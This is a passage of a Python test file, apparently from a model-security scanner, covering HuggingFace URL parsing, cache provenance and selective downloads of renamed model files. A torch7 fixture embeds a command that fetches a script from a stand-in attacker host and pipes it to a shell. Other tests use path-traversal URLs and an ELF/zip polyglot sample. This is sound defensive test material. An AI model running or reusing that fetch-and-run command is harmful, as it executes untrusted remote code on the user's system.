"""Tests for HuggingFace URL handling."""

import importlib
import pickle
import struct
import tarfile
import zipfile
from collections.abc import Callable, Iterator
from io import BytesIO
from pathlib import Path
from types import SimpleNamespace
from typing import cast
from unittest.mock import ANY, MagicMock, patch

import pytest

from modelaudit.utils.file.detection import detect_file_format_for_skip_filter
from modelaudit.utils.sources.huggingface import (
    _list_repo_files_with_timeout,
    download_file_from_hf,
    download_model,
    download_model_streaming,
    extract_model_id_from_path,
    get_model_info,
    get_model_size,
    is_huggingface_cache_path,
    is_huggingface_file_url,
    is_huggingface_url,
    parse_huggingface_file_url,
    parse_huggingface_url,
    redact_huggingface_url_for_display,
)
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs
from tests.helpers import create_mock_coreml, create_mock_onnx

_HF_TEST_REVISION = "a" * 40


class _FakeRangeResponse:
    def __init__(
        self,
        payload: bytes,
        *,
        headers: dict[str, str] | None = None,
        status_code: int = 206,
    ) -> None:
        self.payload = payload
        self.headers = headers or {}
        self.status_code = status_code

    def __enter__(self) -> "_FakeRangeResponse":
        return self

    def __exit__(self, *_exc_info: object) -> None:
        return None

    def raise_for_status(self) -> None:
        return None

    def iter_content(self, chunk_size: int) -> Iterator[bytes]:
        yield self.payload[:chunk_size]


def _make_tar_payload() -> bytes:
    payload = BytesIO()
    with tarfile.open(fileobj=payload, mode="w") as archive:
        info = tarfile.TarInfo("weights.bin")
        info.size = len(b"weights")
        info.mtime = 0
        archive.addfile(info, BytesIO(b"weights"))
    return payload.getvalue()


def _make_executable_zip_polyglot_payload() -> bytes:
    payload = BytesIO()
    with zipfile.ZipFile(payload, "w") as archive:
        archive.writestr("model.pkl", b"payload")
    return b"\x7fELF" + b"\x02\x01\x01\x00" + (b"\x00" * 56) + payload.getvalue()


def _ubjson_key(key: bytes) -> bytes:
    return b"U" + bytes([len(key)]) + key


def _make_xgboost_ubjson_payload() -> bytes:
    return (
        b"{"
        + _ubjson_key(b"learner")
        + b"{"
        + _ubjson_key(b"learner_model_param")
        + b"{}"
        + b"}"
        + _ubjson_key(b"version")
        + b"[]"
        + b"}"
    )


def _make_tensorflow_savedmodel_payload(_tmp_path: Path) -> bytes:
    if not has_tensorflow_protobuf_stubs():
        pytest.skip("TensorFlow protobuf stubs unavailable")
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    node = saved_model.meta_graphs.add().graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    return cast(bytes, saved_model.SerializeToString())


def _make_coreml_payload(tmp_path: Path) -> bytes:
    return create_mock_coreml(tmp_path / "fixture.mlmodel").read_bytes()


def _make_onnx_payload(tmp_path: Path) -> bytes:
    pytest.importorskip("onnx")
    return create_mock_onnx(tmp_path / "fixture.onnx", op_type="PythonOp").read_bytes()


class TestHuggingFaceURLDetection:
    """Test HuggingFace URL detection."""

    def test_valid_huggingface_urls(self):
        """Test that valid HuggingFace URLs are detected."""
        valid_urls = [
            "https://huggingface.co/bert-base-uncased",
            "https://huggingface.co/gpt2/model",
            "https://hf.co/facebook/bart-large",
            "hf://llama/llama-7b",
            "http://huggingface.co/test/model",
            "https://user:pass@huggingface.co/test/model?token=hf_secret",
        ]
        for url in valid_urls:
            assert is_huggingface_url(url), f"Failed to detect valid URL: {url}"

    def test_invalid_huggingface_urls(self):
        """Test that invalid URLs are not detected as HuggingFace URLs."""
        invalid_urls = [
            "https://github.com/user/repo",
            "https://example.com/model",
            "/path/to/local/file",
            "file:///path/to/file",
            "s3://bucket/key",
            "",
            "huggingface.co/model",  # Missing protocol
        ]
        for url in invalid_urls:
            assert not is_huggingface_url(url), f"Incorrectly detected invalid URL: {url}"


class TestHuggingFaceURLParsing:
    """Test HuggingFace URL parsing."""

    def test_parse_https_urls(self):
        """Test parsing HTTPS HuggingFace URLs."""
        test_cases = [
            ("https://huggingface.co/bert-base/uncased", ("bert-base", "uncased")),
            ("https://hf.co/facebook/bart-large", ("facebook", "bart-large")),
            ("https://huggingface.co/user/model/", ("user", "model")),
        ]
        for url, expected in test_cases:
            namespace, repo = parse_huggingface_url(url)
            assert (namespace, repo) == expected, f"Failed to parse {url}"

    def test_parse_hf_protocol_urls(self):
        """Test parsing hf:// protocol URLs."""
        test_cases = [
            ("hf://bert-base/uncased", ("bert-base", "uncased")),
            ("hf://facebook/bart-large", ("facebook", "bart-large")),
            ("hf://user/model/", ("user", "model")),
        ]
        for url, expected in test_cases:
            namespace, repo = parse_huggingface_url(url)
            assert (namespace, repo) == expected, f"Failed to parse {url}"

    def test_parse_single_component_urls(self):
        """Test parsing single-component URLs (models without namespaces)."""
        test_cases = [
            ("https://huggingface.co/gpt2", ("gpt2", "")),
            ("https://hf.co/bert-base-uncased", ("bert-base-uncased", "")),
            ("hf://gpt2", ("gpt2", "")),
            ("hf://bert-base-uncased", ("bert-base-uncased", "")),
        ]
        for url, expected in test_cases:
            namespace, repo = parse_huggingface_url(url)
            assert (namespace, repo) == expected, f"Failed to parse {url}"

    def test_parse_invalid_urls(self):
        """Test that invalid URLs raise ValueError."""
        invalid_urls = [
            "https://github.com/user/repo",
            "hf://",  # Empty path
            "",  # Empty string
        ]
        for url in invalid_urls:
            with pytest.raises(ValueError):
                parse_huggingface_url(url)

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/%2e%2e/model",
            "https://huggingface.co/org/%2e%2e",
            "https://huggingface.co/org/repo%2F..%2Fescape",
            "hf://org%2F..%2Fescape/model",
            "hf://org/repo%5Cescape",
        ],
    )
    def test_parse_rejects_unsafe_repo_components(self, url: str) -> None:
        """Decoded repo-id components must not become path traversal segments."""
        with pytest.raises(ValueError):
            parse_huggingface_url(url)

        assert is_huggingface_url(url) is False


class TestExtractModelIdFromPath:
    """Test HuggingFace model ID extraction from local paths."""

    def test_extract_model_id_from_local_config(self, tmp_path: Path) -> None:
        """Local config metadata should still be extracted as local provenance."""
        model_dir = tmp_path / "model"
        model_dir.mkdir()
        model_path = model_dir / "weights.bin"
        model_path.write_bytes(b"weights")
        (model_dir / "config.json").write_text('{"_name_or_path": "Qwen/Qwen2.5-0.5B"}')

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "local")

    def test_extract_model_id_from_hf_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Local HuggingFace cache paths should use distinct cache provenance."""
        hf_home = tmp_path / ".cache" / "huggingface"
        monkeypatch.setenv("HF_HOME", str(hf_home))
        model_path = hf_home / "hub" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_extract_model_id_from_hf_home_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """HF_HOME relocation should still be recognized as HuggingFace cache provenance."""
        monkeypatch.setenv("HF_HOME", str(tmp_path / "custom-hf-home"))
        model_path = (
            tmp_path / "custom-hf-home" / "hub" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        )
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_extract_model_id_from_symlinked_hf_home_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Resolved cache roots should still match paths reached through symlinked HF_HOME."""
        real_home = tmp_path / "real-hf-home"
        link_home = tmp_path / "link-hf-home"
        real_home.mkdir()
        try:
            link_home.symlink_to(real_home, target_is_directory=True)
        except OSError as exc:
            pytest.skip(f"symlink creation unavailable: {exc}")

        monkeypatch.setenv("HF_HOME", str(link_home))
        model_path = link_home / "hub" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_extract_model_id_from_hf_hub_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """HF_HUB_CACHE relocation should override the default HuggingFace cache root."""
        monkeypatch.setenv("HF_HOME", str(tmp_path / "ignored-home"))
        monkeypatch.setenv("HF_HUB_CACHE", str(tmp_path / "custom-hub-root"))
        model_path = (
            tmp_path / "custom-hub-root" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        )
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_hf_cache_path_resolution_handles_symlink_loop(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        requires_symlinks: None,
    ) -> None:
        """Looped cache symlinks should not abort HuggingFace cache provenance checks."""
        hf_home = tmp_path / "hf-home"
        monkeypatch.setenv("HF_HOME", str(hf_home))
        model_root = hf_home / "hub" / "models--Qwen--Qwen2.5-0.5B"
        model_root.mkdir(parents=True)
        loop_path = model_root / "snapshots"
        loop_path.symlink_to(loop_path, target_is_directory=True)

        looped_metadata_path = loop_path / "abc123" / "model.metadata"

        assert is_huggingface_cache_path(looped_metadata_path) is True

    def test_extract_model_id_rejects_spoofed_models_directory(self, tmp_path: Path) -> None:
        """A local models--* directory without HF cache layout should not be treated as HuggingFace."""
        model_path = tmp_path / "models--Qwen--Qwen2.5-0.5B" / "weights.bin"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == (None, None)

    def test_extract_model_id_rejects_spoofed_hf_cache_root(self, tmp_path: Path) -> None:
        """Only the real .cache/huggingface/hub layout should count as HF cache provenance."""
        model_path = (
            tmp_path
            / "project"
            / "huggingface"
            / "hub"
            / "models--Qwen--Qwen2.5-0.5B"
            / "snapshots"
            / "abc123"
            / "weights.bin"
        )
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == (None, None)


class TestModelDownload:
    """Test model downloading functionality."""

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_success(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test successful model download."""
        # Mock the snapshot_download to return a path
        mock_path = tmp_path / "test_model"
        mock_path.mkdir()
        (mock_path / "model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(mock_path)

        # Test download
        result = download_model("https://huggingface.co/test/model")

        # Verify the download was called correctly
        mock_snapshot_download.assert_called_once()
        call_args = mock_snapshot_download.call_args
        assert call_args[1]["repo_id"] == "test/model"
        assert result == mock_path

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_with_cache_dir(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test model download with custom cache directory."""
        mock_path = tmp_path / "test" / "model"
        mock_path.mkdir(parents=True)
        (mock_path / "model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(mock_path)

        cache_dir = tmp_path / "custom_cache"
        download_model("hf://test/model", cache_dir=cache_dir)

        # Verify cache directory was used (we now use local_dir instead of cache_dir for safety)
        call_args = mock_snapshot_download.call_args
        assert call_args[1]["local_dir"] == str(cache_dir / "huggingface" / "test" / "model")

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_revalidates_existing_cache(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Existing local cache directories should still delegate freshness checks to the HF SDK."""
        cache_dir = tmp_path / "custom_cache"
        existing_path = cache_dir / "huggingface" / "test" / "model"
        existing_path.mkdir(parents=True)
        (existing_path / "config.json").write_text("{}", encoding="utf-8")
        (existing_path / "model.bin").write_bytes(b"stale bytes")
        mock_snapshot_download.return_value = str(existing_path)

        result = download_model("hf://test/model", cache_dir=cache_dir)

        assert result == existing_path
        mock_snapshot_download.assert_called_once()
        assert mock_snapshot_download.call_args.kwargs["local_dir"] == str(existing_path)

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "repo listing failed"),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_error_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Listing failures must not silently skip renamed content-routed payloads."""
        with pytest.raises(Exception, match=r"selective filtering incomplete.*repo listing failed"):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_timeout_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
    ) -> None:
        """Listing timeouts must not silently skip renamed content-routed payloads."""

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(None, None, "timed out after 30 seconds"),
            ),
            pytest.raises(Exception, match=r"selective filtering incomplete.*timed out after 30 seconds"),
        ):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_timeout_uses_hfapi_timeout(self, mock_repo_info: MagicMock) -> None:
        """Timeout helper should use the request-layer timeout instead of background threads."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            siblings=[SimpleNamespace(rfilename="config.json")],
        )

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files == ["config.json"]
        assert revision == _HF_TEST_REVISION
        assert error is None
        mock_repo_info.assert_called_once_with("test/model", timeout=7, files_metadata=False)

    @pytest.mark.parametrize("revision", [None, "", "main", "g" * 40])
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_non_commit_revision(
        self,
        mock_repo_info: MagicMock,
        revision: str | None,
    ) -> None:
        """Selective filtering must not trust a mutable or malformed repository revision."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=revision,
            siblings=[SimpleNamespace(rfilename="model.bin")],
        )

        repo_files, pinned_revision, error = _list_repo_files_with_timeout("test/model")

        assert repo_files == ["model.bin"]
        assert pinned_revision is None
        assert error == "repository listing did not include an immutable commit SHA"

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload"], None, "repository listing missing immutable revision"),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fails_closed_without_immutable_revision(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Snapshot filtering must stop before probing or downloading a mutable revision."""
        with pytest.raises(Exception, match="repository listing missing immutable revision"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["weights[latest].bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_escapes_selected_filenames_as_exact_allow_patterns(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Untrusted repository filenames must not change snapshot glob selection."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "config.json").write_text("{}")
        (download_path / "weights[latest].bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["weights[[]latest].bin"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload", "preview.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_content_routed_skipped_file(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Selective snapshot downloads should include renamed content-routed model files."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        (download_path / "evil.payload").write_bytes(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
        mock_snapshot_download.return_value = str(download_path)

        def get_side_effect(url: str, **_kwargs: object) -> _FakeRangeResponse:
            if url.endswith("/evil.payload"):
                return _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
            return _FakeRangeResponse(b"\x89PNG\r\n\x1a\n" + b"\x00" * 16)

        mock_requests_get.side_effect = get_side_effect

        download_model("https://huggingface.co/test/model")

        allow_patterns = mock_snapshot_download.call_args.kwargs["allow_patterns"]
        assert allow_patterns == ["pytorch_model.bin", "evil.payload"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert all(f"/resolve/{_HF_TEST_REVISION}/" in call.args[0] for call in mock_requests_get.call_args_list)
        assert all(call.kwargs["headers"]["Accept-Encoding"] == "identity" for call in mock_requests_get.call_args_list)

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_accepts_content_routed_only_snapshot(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Post-download verification should recognize selected renamed model payloads."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "hidden.payload").write_bytes(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)

        assert download_model("https://huggingface.co/test/model") == download_path
        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == "tflite"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fails_closed_when_snapshot_omits_selected_file(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Snapshot downloads must contain every file selected during immutable preflight."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "config.json").write_text("{}")
        mock_snapshot_download.return_value = str(download_path)

        with pytest.raises(Exception, match=r"snapshot missing 1 selected file\(s\) for test/model"):
            download_model("https://huggingface.co/test/model")

    @pytest.mark.parametrize(
        "payload, expected_format",
        [
            (
                struct.pack("<Q", len(b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'))
                + b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'
                + b"\x00\x00\x00\x00",
                "safetensors",
            ),
            (pickle.dumps({"weights": [1, 2, 3]}, protocol=0), "pickle"),
            (_make_tar_payload(), "tar"),
            (b"\x0a\x07version\x0a\x03uidCompositeFunction", "cntk"),
            (
                b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
                b"max_feature_idx=0\ntree=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n",
                "lightgbm",
            ),
            (b'<?xml version="1.0" encoding="UTF-8"?><PMML version="4.4"></PMML>', "pmml"),
            (b'{"orbax_version":"1.0","framework":"jax"}', "jax_checkpoint"),
            (
                b'{"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
                "mxnet",
            ),
            (b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00", "executorch"),
            (b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03", "flax_msgpack"),
            (
                b"\xdb" + (9000).to_bytes(4, "big") + b"x" * 9000 + b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
                "flax_msgpack",
            ),
            (
                b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
                b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n",
                "torch7",
            ),
            (b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n", "llamafile"),
            (_make_executable_zip_polyglot_payload(), "executable_zip_polyglot"),
        ],
        ids=[
            "safetensors",
            "protocol0-pickle",
            "tar",
            "cntk",
            "lightgbm",
            "pmml-xml",
            "jax-json",
            "mxnet",
            "executorch",
            "flax-msgpack",
            "flax-msgpack-delayed-root",
            "torch7",
            "llamafile",
            "executable-zip-polyglot",
        ],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_bounded_content_routed_payloads(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        payload: bytes,
        expected_format: str,
    ) -> None:
        """Selective downloads should preserve renamed payloads recognized by bounded probes."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        (download_path / "hidden.payload").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "hidden.payload"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == expected_format

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_extensionless_xgboost_ubjson(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Extensionless XGBoost UBJSON should survive remote and local routing."""
        payload = _make_xgboost_ubjson_payload()
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        xgboost_path = download_path / "model"
        xgboost_path.write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "model"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert detect_file_format_for_skip_filter(str(xgboost_path)) == "xgboost"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_skips_suffixed_xgboost_ubjson(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Remote routing should match the extensionless-only local XGBoost contract."""
        payload = _make_xgboost_ubjson_payload()
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @pytest.mark.parametrize("filename", ["checkpoint.py", "checkpoint.pyw"])
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_skips_jax_json_source_files(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_get_extensions: MagicMock,
        filename: str,
        tmp_path: Path,
    ) -> None:
        """Remote JAX routing should preserve the local source-file exclusions."""
        payload = b'{"orbax_version":"1.0","framework":"jax"}'
        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(["pytorch_model.bin", filename], _HF_TEST_REVISION, None),
        ):
            download_path = tmp_path / "download"
            download_path.mkdir()
            (download_path / "pytorch_model.bin").write_bytes(b"weights")
            mock_snapshot_download.return_value = str(download_path)
            mock_requests_get.return_value = _FakeRangeResponse(payload)

            download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @pytest.mark.parametrize(
        "payload_factory, expected_format",
        [
            (_make_tensorflow_savedmodel_payload, "tf_savedmodel"),
            (_make_coreml_payload, "coreml"),
            (_make_onnx_payload, "onnx"),
        ],
        ids=["tensorflow-protobuf", "coreml-protobuf", "onnx-protobuf"],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_bounded_content_routed_protobuf_payloads(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        payload_factory: Callable[[Path], bytes],
        expected_format: str,
    ) -> None:
        """Selective downloads should preserve renamed framework protobuf payloads."""
        payload = payload_factory(tmp_path)
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        (download_path / "hidden.payload").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "hidden.payload"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == expected_format

    @pytest.mark.parametrize(
        "payload",
        [
            struct.pack("<Q", 4) + b"\x00" * 8,
            struct.pack("<Q", (16 * 1024 * 1024) + 1) + b"{" + b"\x00" * 7,
            b"\x0a\x07version\x0a\x03uid",
            (
                b"tree implementation notes\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
                b"max_feature_idx=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n"
            ),
            b'<?xml version="1.0"?><project><PMML-not-root /></project>',
            b'{"framework":"ajax","payload":"not a JAX checkpoint"}',
            b"{" + _ubjson_key(b"learner") + b"{}" + _ubjson_key(b"metadata") + b"{}" + b"}",
            b'{"nodes":[{"op":"Custom"}],"arg_nodes":[],"heads":[[0,0,0]]}',
            b"\x0c\x00\x00\x00ETAA\x04\x00\x04\x00\x04\x00\x00\x00",
            b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x00\x00\x00\x00",
            b"\x81\xa8metadata\xa4safe",
            b"import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n",
            b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime",
            b"\x12\x02\x08\x01",
            b"\x08\x08\x12\x02\x08\x01",
            b"\x08\x08\x3a\x02\x08\x01",
            b"\x06\xc1" + b"\x00" * ((1024 * 1024) + 32),
        ],
        ids=[
            "malformed-safetensors",
            "truncated-oversized-safetensors",
            "cntk-notes",
            "lightgbm-notes",
            "xml-notes",
            "ajax-json",
            "xgboost-ubjson-near-match",
            "mxnet-notes",
            "executorch-near-match",
            "executorch-invalid-flatbuffer",
